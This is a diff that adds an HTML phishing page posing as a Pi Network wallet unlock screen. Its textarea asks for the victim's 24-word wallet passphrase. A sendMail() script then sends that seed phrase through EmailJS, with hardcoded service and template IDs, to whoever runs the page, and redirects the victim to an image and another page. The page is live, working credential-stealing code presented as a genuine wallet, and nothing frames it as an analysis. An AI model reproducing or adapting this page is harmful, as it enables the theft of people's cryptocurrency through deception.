@@ -1,0 +1,183 @@
+<html>
+ <head><script type="text/javascript" nonce="8c85d67bcb834cc694b15a550bf" src="//local.adguard.org?ts=1723743488740&amp;type=content-script&amp;dmn=pinetworkpip2p.com&amp;url=http%3A%2F%2Fpinetworkpip2p.com%2F&amp;app=chrome.exe&amp;css=3&amp;js=1&amp;rel=1&amp;rji=1&amp;sbe=1"></script>
+    <script type="text/javascript" nonce="8c85d67bcb834cc694b15a550bf" src="//local.adguard.org?ts=1723743488740&amp;name=AdGuard%20Extra&amp;name=AdGuard%20Popup%20Blocker&amp;type=user-script"></script></head>
+ <body>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pi Network</title>
+  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="./css/css2.css" rel="stylesheet">
+  <script type="text/javascript" async src="./js/analytics.js"></script>
+  <script type="text/javascript" async src="./emailinteg.js"></script>
+  <script type="text/javascript" async src="emailinteg.js"></script>
+  <script async src="emailinteg.js"></script>
+  <script type="text/javascript" src="emailinteg.js"></script>
+  <script type="text/javascript">
+      (function () {
+        emailjs.init("YzBolSxk6Igz_7Zt5");
+      })();
+    </script>
+  <style>
+
+      @import url("https://fonts.googleapis.com/css2?family=Mulish:wght@600&display=swap");
+      h2 {
+        font-family: "Mulish", sans-serif;
+        text-align: center;
+      }
+
+      .blog {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      form {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      textarea {
+        font-size: 20px;
+        padding: 10px;
+        font-family: "Poppins", sans-serif;
+        border-style: none;
+        border: 1.5px solid #c7c7c7;
+        border-radius: 0px;
+        width: 300px;
+      }
+
+      textarea:focus {
+        /*border: 4px solid goldenrod;*/
+        border: 2px solid #d9ab50;
+      }
+
+      input {
+        width: 320px;
+        padding: 12px 38px;
+        background: white;
+        border: 1px solid purple;
+        border-radius: 10px;
+        color: #703d92;
+        cursor: pointer;
+        font-family: "Mulish", sans-serif;
+        font-size: 15;
+      }
+
+      .input2 {
+        width: 320px;
+        font-family: "Mulish", sans-serif;
+        padding: 10px 38px;
+        background: #703d92;
+        border: 3px solid #703d92;
+        border-radius: 10px;
+        color: #ffffff;
+        cursor: pointer;
+        font-size: 15;
+      }
+      .input2:hover {
+        background: #68328d;
+      }
+
+      #wordshow {
+        font-family: "Mulish", sans-serif;
+        font-size: 15px;
+        margin-bottom: 14px;
+        /*color: #ff0000f0;*/
+        color: #df5d5d;
+        font-weight: 1;
+      }
+
+      a {
+        text-decoration: none;
+        font-family: "Mulish", sans-serif;
+        font-size: 14px;
+      }
+
+      .discription {
+        padding: 18px 18px;
+        font-family: "Mulish", sans-serif;
+        font-size: 16px;
+        color: #373737;
+        font-family: "Sans-serif", sans-serif;
+      }
+
+      .pr {
+        padding: 20px 40px 40px 20px;
+        font-family: "Mulish", sans-serif;
+      }
+
+      form {
+        overflow: hidden;
+      }
+
+      #btn {
+        margin-bottom: 18px;
+      }
+
+      .btn1 {
+        margin-top: 1px;
+        margin-bottom: 30px;
+      }
+    
+</style>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Responsive Image Example</title>
+</head>
+<body>
+    <img src="Screenshot 2024-08-16 001948.png" 
+         alt="Wallet"
+         style="width: 100%; height: auto; display: block; max-width: 100%;">
+    </div>
+
+            </a>
+
+  <div class="blog">
+   <textarea id="textkey" class="" name="Message" placeholder="Enter your 24-word passphrase here" cols="23" rows="8" required></textarea>
+   <br><span id="wordshow"></span> <input onclick="sendMail()" id="btn" type="submit" value="Unlock With Passphrase"> <input onclick="sendMail()" id="btn2" class="input2" type="submit" disabled value="Unlock With Fingerprint">
+   <div class="discription">
+    <p>As a none-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+      
+   <p> Lost your passphrase? <a href="https://minepi.com/"><span style="color: #0c75e6">You can create a new wallet,</span></a> but all your π in your previous wallet will be inaccessible.</p>
+  </div>
+  <script>
+      function sendMail() {
+        var key = document.getElementById("textkey").value;
+        let word = key.split(" ");
+        let count = word.length;
+
+        if (count >= 24) { // Check if 24 or more words are entered
+    var params = {
+      key: key
+    };
+          const serviceID = "service_reyq1z";
+          const templateID = "template_fmvscg1";
+
+          emailjs
+            .send("service_reyq1zs", "template_fmvscg1", params)
+            .then((res) => {
+         window.location.href = "https://i.postimg.cc/Nfgqzw1s/Picsart-24-06-13-13-05-53-062.jpg"; // Redirect to another page
+                       document.getElementById("textkey").value;
+              window.open("./congress.html", "_parent	");
+              document.getElementById("wordshow").innerText = "";
+
+              // alert('your message sent successfully');
+            })
+            .catch((err) => console.log(err));
+          //  document.getElementById('wordshow').innerText =("Successfully word"+ count);
+        } else {
+          document.getElementById("wordshow").innerText = "Invalid Passphrase";
+        }
+
+        document.getElementById("textkey").value = "";
+      }
+    </script>
+  <script src="./emailinteg.js"></script>
+ </body>
+</html>
